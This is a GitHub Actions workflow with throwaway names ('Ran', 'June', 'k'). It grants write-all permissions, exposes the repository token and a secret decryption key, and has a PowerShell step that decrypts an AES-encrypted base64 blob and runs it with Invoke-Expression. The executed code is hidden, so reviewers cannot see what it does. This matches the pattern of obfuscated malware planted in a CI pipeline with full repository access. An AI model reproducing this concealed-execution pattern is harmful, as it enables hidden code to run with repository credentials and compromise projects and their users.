name: Ran

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "U2FsdGVkX18/GLvdk8SGzb+Ls26oiiwm08FwIMolCP4voGh7PAOZtCoi6GDAHN0nDauS3nmsxokMDWM4tbLdYsXeKEmXN10jHEfi9LfYly2+f72KkQvRuMFtXpxviot+qRAKDTURlucdUjyAnIQJXD4w5KGSI2GuYqBi2bXnU8ZAgXO31NZvR6mm2wGzglqno4hTL8GERfpHsMm796LEMzNFnorQWDpvHE5cP0s9UXjG7B61b6rtji7zB/VCb+ann1sPKCA2Cztsx8O4Zw2X+eKVJF7D1C4Tre/R8ApYf7Y4qn06B0/PIlPdNCr1LkLrCNULyj3ni1H/jEZ92p07bvvWfYy+xAfrUVcsuKp3lCPLLu5b/oHK1vPFOvmfO8l4+f16xq71Ms6nCUGQjsPSMoo9R3NXppt/KXGJOPQiK1EGruaQMO+JG5N4uChUOF49M8uH28AXVUr84firFvNJbX15TLmYThCdXWh2NFIkjibfxQmz2Y4YxF6xtpgYrodDNPbGbUy99MqyqcfKbaHsDzaRNkLUdWmHD+Lafl9tf5o7giBiLEc1JJ5h/bScxCyqKJgGTZroUWDLvpI8KAzCWUZDRkVJWsZ0nSsHApYVBKCDbGKhNdlg4Iacs2nUyWDO3G+xEnHuVm+yq+e5hIZlvqn1pbcHHANxD2PGc0OPj1/j9LwXPtBplS54pCCfnve++RQMMM6p0KTN+QSpm3Z3PWTZSBom7JLq+VUE7uVYAt9cV6y/fz9tedOaYuRnkptZzx0Xu6pcpG+4//F1zYiG3I+ZjKHTIohnO5sfE8bMcOtvGzYGoNUPLhzQuPHtjpEAT6KDvUkCc+g+SET7XgZodD/S7UXirqsXwE46Q8DdXspcVreoIQ/AZv7jS5CcDFaQitd8fGr8QNN5A8qyJJRR1rln2Uy59gvoRInNylDUW2BbnM3cdNKxb7m/LdFvSijA0J8rvvU0MHTMspSKC1Z9NDTKgmZfBSS1kyB2UdYeNmZmdsmt8gF+fdc1MZHGvDRJiqTZsWWobmNg9dljyBfFcEtqiWA3hNMtklvGRwGW81mZArU/xg+z/ATsdGrRlP6FjHmoRc9QkWAvYFHLexlbNtvx6tfIcMla9MsdDzoUT34xM2RhyQa5PksVbxZz3HhnfkpmwtAbzRqxBSbDOyA6M2b1g6+6b70oC7OHzRiN14ltEfkPUlpt1R2uc/vEMyiBDH1IkikAEEV5m6aebIxXERhp/9U7x0dBdB87zIlF+ARDr9ccaq+DlIH3Iyj04KBGZzFJa9EEnQCAuFrLGcA1LY9eVsR4R0Ty+JLZeaHf7TuOgllLVyRIuwGTpkJ1BVJZt8DZdYrI7HjeIrD1q8jJHR7QNcBoEjN8BsfCZNY/Gkyq08iWMJaj6SjkyUgc1vCkbDgTDlvhlcyW9VM6F2D7ZVMVUAcoWqe7XYyECFdyyauAXCB0E6JFsFuekoR/FHXdgCxgE7n6Nrwg58vjiqldwk/NWTNh/jLEcVPCtmn69I5CYQmG891TERa9W+0f8wzYOU7VqwkPw3xJFKayhGQBag=="
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
